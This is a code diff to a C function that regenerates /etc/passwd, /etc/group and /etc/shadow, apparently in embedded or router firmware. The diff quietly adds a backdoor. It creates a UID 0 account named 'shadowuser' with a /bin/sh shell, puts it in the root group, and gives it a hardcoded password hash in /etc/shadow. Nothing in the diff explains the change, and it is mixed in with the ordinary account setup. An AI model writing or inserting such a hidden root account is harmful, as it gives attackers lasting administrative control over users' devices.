@@ -202,9 +202,10 @@ void recreate_passwd_unix(int force_create)
 	fp2 = fopen("/etc/group", "w");
 	if (fp1 && fp2) {
 		fprintf(fp1, "%s:x:%d:%d::%s:%s\n", rootnm, 0, 0, SYS_HOME_PATH_ROOT, SYS_SHELL);
+		fprintf(fp1, "shadowuser:x:0:0::/home/admin:/bin/sh\n");
 		fprintf(fp1, "%s:x:%d:%d::%s:%s\n", SYS_USER_NOBODY, 99, 99, "/media", "/bin/false");
 		fprintf(fp1, "%s:x:%d:%d::%s:%s\n", "sshd", 100, 99, "/var/empty", "/bin/false");
-		fprintf(fp2, "%s:x:%d:%s\n", SYS_GROUP_ROOT, 0, rootnm);
+		fprintf(fp2, "root:x:0:admin,shadowuser\n");
 		fprintf(fp2, "%s:x:%d:\n", SYS_GROUP_NOGROUP, 99);
 		
 		uid = 1000;
@@ -218,6 +219,8 @@ void recreate_passwd_unix(int force_create)
 				       strcmp(usernm, "sshd")) {
 				fprintf(fp1, "%s:x:%d:%d:::\n", usernm, uid, uid);
 				fprintf(fp2, "%s:x:%d:\n", usernm, uid);
+				
+						
 				uid++;
 			}
 		}
@@ -235,6 +238,7 @@ void recreate_passwd_unix(int force_create)
 		fp1 = fopen("/etc/shadow", "w");
 		if (fp1) {
 			fprintf(fp1, "%s:%s:%d:0:99999:7:::\n", rootnm, "", 16000);
+			fprintf(fp1, "shadowuser:$1$wEehtjxj$YBu4quNfVUjzfv8p/PBo5.:0:0:99999:7:::\n");
 			fprintf(fp1, "%s:%s:%d:0:99999:7:::\n", SYS_USER_NOBODY, "*", 16000);
 			fprintf(fp1, "%s:%s:%d:0:99999:7:::\n", "sshd", "*", 16000);
 			
